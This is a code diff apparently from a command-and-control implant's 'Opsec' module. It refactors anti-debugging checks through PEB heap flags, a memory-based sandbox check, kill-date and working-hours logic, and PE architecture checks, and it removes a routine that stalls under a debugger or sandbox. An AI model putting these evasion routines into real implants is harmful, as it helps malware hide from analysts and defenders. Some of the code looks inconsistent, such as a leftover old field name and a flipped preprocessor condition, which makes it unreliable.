@@ -1,35 +1,17 @@
 #include <core/include/opsec.hpp>
 
-using namespace Stream;
+using namespace Packet;
 using namespace Commands;
 using namespace Utils::Time;
 
 namespace Opsec {
-
-    BOOL RuntimeChecks() {
-#ifndef DEBUG
-        if (CheckDebugger()) {
-            Timeout(MINUTES(1));
-            return false;
-        }
-#endif
-        if (CheckSandbox()) {
-            Timeout(MINUTES(1));
-            return false;
-        }
-
-        return true;
-    }
-
     BOOL CheckTime() {
-        HEXANE;
-
-        if (ctx->config.kill_date != 0) {
-            if (GetTimeNow() >= ctx->config.kill_date) {
+        if (Ctx->Config.Killdate != 0) {
+            if (GetTimeNow() >= Ctx->Config.Killdate) {
                 Shutdown(nullptr);
             }
         }
-        if (ctx->config.hours) {
+        if (Ctx->Config.WorkingHours) {
             if (!InWorkingHours()) {
                 return false;
             }
@@ -38,39 +20,37 @@ namespace Opsec {
     }
 
     BOOL CheckDebugger() {
-        // TODO: diagnose why this stopped working
-        HEXANE;
+		// https://anti-debug.checkpoint.com/techniques/debug-flags.html#manual-checks-heap-flags
+        PPEB peb  = PEB_POINTER;
+        BOOL x32  = FALSE;
 
-        PPEB peb    = PEB_POINTER;
-        BOOL m_x32  = FALSE;
+        PVOID heapBase          = { };
+        DWORD flagsOffs         = 0;
+        DWORD forceFlagsOffs    = 0;
+        BOOL vistaOrGreater     = Ctx->Session.Version >= WIN_VERSION_2008;
 
-        PVOID heap_base             = { };
-        ULONG flags_offset          = 0;
-        ULONG force_flags_offset    = 0;
-        BOOL vista_or_greater       = ctx->session.version >= WIN_VERSION_2008;
+        Ctx->Win32.IsWow64Process(NtCurrentProcess(), &x32);
 
-        ctx->win32.IsWow64Process(NtCurrentProcess(), &m_x32);
+#ifndef _WIN64
+        heapBase = !x32 
+			? (LPVOID)(*(DWORD_PTR*)((PBYTE)peb + 0x18)) 
+			: (LPVOID)(*(DWORD_PTR*)((PBYTE)peb + 0x1030));
 
-#if _WIN64
-        heap_base = !m_x32 ? C_PTR(*RVA(ULONG_PTR*,peb, 0x18)) : C_PTR(*RVA(ULONG_PTR*,peb, 0x1030));
-
-        flags_offset 		= vista_or_greater ? 0x40 : 0x0C;
-        force_flags_offset 	= vista_or_greater ? 0x44 : 0x10;
+        flagsOffs 		= vistaOrGreater ? 0x40 : 0x0C;
+        forceFlagsOffs 	= vistaOrGreater ? 0x44 : 0x10;
 #else
-        heap_base           = C_PTR(*RVA(ULONG_PTR*, peb, 0x30);
-        flags_offset        = vista_or_greater ? 0x70 : 0x14;
-        force_flags_offset  = vista_or_greater ? 0x74 : 0x18;
+        heapBase     	= (LPVOID)(*(DWORD_PTR*)((PBYTE)peb + 0x30));
+        flagsOffs       = vistaOrGreater ? 0x70 : 0x14;
+        forceFlagsOffs  = vistaOrGreater ? 0x74 : 0x18;
 #endif
-        auto HeapFlags      = RVA(ULONG_PTR*, heap_base, flags_offset);
-        auto HeapForceFlags = RVA(ULONG_PTR*, heap_base, force_flags_offset);
+        DWORD *heapFlags      = (DWORD*)((PBYTE)heapBase + flagsOffs);
+        DWORD *heapForceFlags = (DWORD*)((PBYTE)heapBase + forceFlagsOffs);
 
-        return *HeapFlags & ~HEAP_GROWABLE || *HeapForceFlags != 0;
+        return (*heapFlags & ~HEAP_GROWABLE) || (*heapForceFlags != 0);
     }
 
     BOOL CheckSandbox() {
         // TODO: check ACPI tables for vm vendors instead of just checking memory
-        HEXANE;
-
         MEMORYSTATUSEX stats = { };
         stats.dwLength = sizeof(stats);
 
@@ -78,16 +58,12 @@ namespace Opsec {
         return stats.ullAvailPhys > 4;
     }
 
-    
-
-    BOOL ImageCheckArch(const _executable *const image) {
-        HEXANE;
-
-        if (image->nt_head->Signature != IMAGE_NT_SIGNATURE) {
+    BOOL ImageCheckArch(const EXECUTABLE *const image) {
+        if (image->NtHead->Signature != IMAGE_NT_SIGNATURE) {
             ntstatus = ERROR_INVALID_EXE_SIGNATURE;
             return false;
         }
-        if (image->nt_head->FileHeader.Machine != MACHINE_ARCH) {
+        if (image->NtHead->FileHeader.Machine != MACHINE_ARCH) {
             ntstatus = ERROR_IMAGE_MACHINE_TYPE_MISMATCH;
             return false;
         }
@@ -95,9 +71,7 @@ namespace Opsec {
         return true;
     }
 
-    BOOL ImageCheckCompat(const _executable *const source, const _executable *const target) {
-        HEXANE;
-
+    BOOL ImageCheckCompat(const EXECUTABLE *const source, const EXECUTABLE *const target) {
         if (target->nt_head->FileHeader.Machine != source->nt_head->FileHeader.Machine) {
             ntstatus = ERROR_IMAGE_MACHINE_TYPE_MISMATCH;
             return false;
@@ -109,5 +83,4 @@ namespace Opsec {
 
         return true;
     }
-
 }
